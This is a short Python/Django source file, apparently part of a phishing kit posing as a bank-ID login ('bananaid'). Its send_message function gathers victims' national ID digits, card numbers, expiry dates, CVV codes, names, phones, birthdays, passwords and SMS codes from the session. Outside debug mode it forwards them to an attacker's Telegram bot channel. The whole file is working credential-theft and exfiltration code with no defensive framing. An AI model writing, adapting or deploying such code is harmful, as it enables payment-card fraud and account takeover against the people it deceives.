import requests
from django.conf import settings

from bananaid.settings import DEBUG

fields = {
    'siffer': '🆔',
    'cardnumber': '💳',
    'expirationdate': '💳',
    'securitycode': '💳',
    'full_name': '🎭',
    'phone': '📞',
    'birthday': '📅',
    'password': '📲',
    'sms': '📲'
}


def send_message(session):
    message = '###################\n' \
              '#### 💳 B__A__N__N__A__N__A ~~ N_O 💳 ####\n' \
              '###################\n\n'

    if session.__dict__.get('_session_cache'):
        for field in session.__dict__.get('_session_cache'):
            if field == 'device':
                message += '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n'
            i = '' if fields.get(field) is None else fields.get(field)
            message += i + ' ' + field + ' : ' + str(session.__dict__.get('_session_cache')[field]) + '   ' + i + '\n'
            if field == 'device':
                message += '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n'

    telegram_settings = settings.TELEGRAM
    if not DEBUG:
        api_url = f"https://api.telegram.org/bot{telegram_settings['bot_token']}/sendMessage"
        response = requests.post(api_url, json={'chat_id': telegram_settings['channel_name'], 'text': message})
    else:
        print(message)
